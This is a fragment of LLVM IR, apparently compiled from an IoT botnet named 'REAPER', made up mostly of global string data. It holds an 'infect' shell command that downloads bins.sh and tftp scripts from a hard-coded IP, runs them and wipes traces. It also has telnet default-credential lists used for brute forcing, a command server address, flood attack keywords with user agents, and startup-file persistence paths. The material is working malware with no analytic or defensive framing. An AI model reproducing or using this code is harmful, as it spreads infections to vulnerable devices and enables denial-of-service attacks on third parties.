@.str.274 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.275 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.276 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.277 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.278 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.279 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.280 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.281 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.282 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.283 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.284 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.285 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.286 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.287 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.288 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.289 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.290 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.291 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.292 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.293 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.294 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.295 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.296 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
@.str.297 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.298 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.299 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.300 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.301 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.302 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.303 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.304 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.305 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.306 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@AllDemDupes = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.307, i32 0, i32 0)], align 8
@.str.307 = private unnamed_addr constant [16 x i8] c"70.32.30.177:23\00", align 1
@infect = global i8* getelementptr inbounds ([311 x i8], [311 x i8]* @.str.308, i32 0, i32 0), align 8
@.str.308 = private unnamed_addr constant [311 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://70.32.30.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 70.32.30.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 70.32.30.177; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@usernames = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.309 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.311 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.312 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.313 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.314 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.315 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.316 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.317 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@HeliosCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.327, i32 0, i32 0), i8* null], align 16
@.str.318 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.322 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.323 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.325 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.331, i32 0, i32 0), i8* null], align 16
@.str.328 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.329 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.330 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.331 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* null], align 16
@.str.332 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.336 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.338 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@.str.339 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.340 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.341 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.423 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.342 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.344 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.345 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GetRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.346 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.347 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.348 = private unnamed_addr constant [93 x i8] c"\1B[1;33mLogin Found \1B[1;31mAttempting To Brute \1B[1;30mLIKE A GOD!!! IP:%s User:%s Pass:%s\1B[0m\00", align 1
@.str.349 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0)], align 16
@.str.351 = private unnamed_addr constant [5 x i8] c"REAP\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"AWS\00", align 1
@.str.354 = private unnamed_addr constant [9 x i8] c"AWSPANEL\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"COCAINE\00", align 1
@.str.356 = private unnamed_addr constant [6 x i8] c"INSTA\00", align 1
@.str.357 = private unnamed_addr constant [16 x i8] c"FLEXINGONLAMERS\00", align 1
@.str.358 = private unnamed_addr constant [7 x i8] c"NULLME\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"STDMETH\00", align 1
@.str.360 = private unnamed_addr constant [9 x i8] c"BUTTHOLE\00", align 1
@.str.361 = private unnamed_addr constant [9 x i8] c"urnangay\00", align 1
@.str.362 = private unnamed_addr constant [7 x i8] c"vegena\00", align 1
@.str.363 = private unnamed_addr constant [5 x i8] c"no u\00", align 1
@.str.364 = private unnamed_addr constant [17 x i8] c"ovhhasalilweiner\00", align 1
@.str.365 = private unnamed_addr constant [17 x i8] c"TRAPNMODSISASKID\00", align 1
@.str.366 = private unnamed_addr constant [10 x i8] c"DANKPOWER\00", align 1
@.str.367 = private unnamed_addr constant [7 x i8] c"udpcri\00", align 1
@.str.368 = private unnamed_addr constant [7 x i8] c"STDCRI\00", align 1
@.str.369 = private unnamed_addr constant [15 x i8] c"NFOServers.com\00", align 1
@.str.370 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.371 = private unnamed_addr constant [6 x i8] c"haxor\00", align 1
@.str.372 = private unnamed_addr constant [15 x i8] c"aws.amazon.com\00", align 1
@.str.373 = private unnamed_addr constant [9 x i8] c"slav.com\00", align 1
@.str.374 = private unnamed_addr constant [9 x i8] c"AWS Menu\00", align 1
@.str.375 = private unnamed_addr constant [9 x i8] c"ganggang\00", align 1
@.str.376 = private unnamed_addr constant [10 x i8] c"instagram\00", align 1
@.str.377 = private unnamed_addr constant [6 x i8] c"rand0\00", align 1
@.str.378 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.379 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.380 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.381 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.382 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.383 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.384 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.385 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.387 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.388 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.389 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.391 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.392 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.393 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.394 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.396 = private unnamed_addr constant [6 x i8] c"PUSSY\00", align 1
@.str.397 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.398 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.399 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.400 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.401 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.402 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.403 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.404 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.406 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.407 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.409 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.410 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.411 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.412 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.413 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.415 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.416 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.417 = private unnamed_addr constant [159 x i8] c"\1B[1;37m[\1B[0;31mREAPER\1B[1;37m] \1B[1;36mDevices Loading\1B[1;37m ~> [IP] ~> [\1B[1;33m%s\1B[1;37m] ~> [BUILD] ~> [\1B[1;35mArch:%s\1B[1;37m] ~> [\1B[1;32mLOADED\1B[1;37m]\1B[34m\00", align 1
@.str.418 = private unnamed_addr constant [9 x i8] c"LELIMDUP\00", align 1
@.str.419 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.420 = private unnamed_addr constant [11 x i8] c"STOLENBOTS\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.422 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
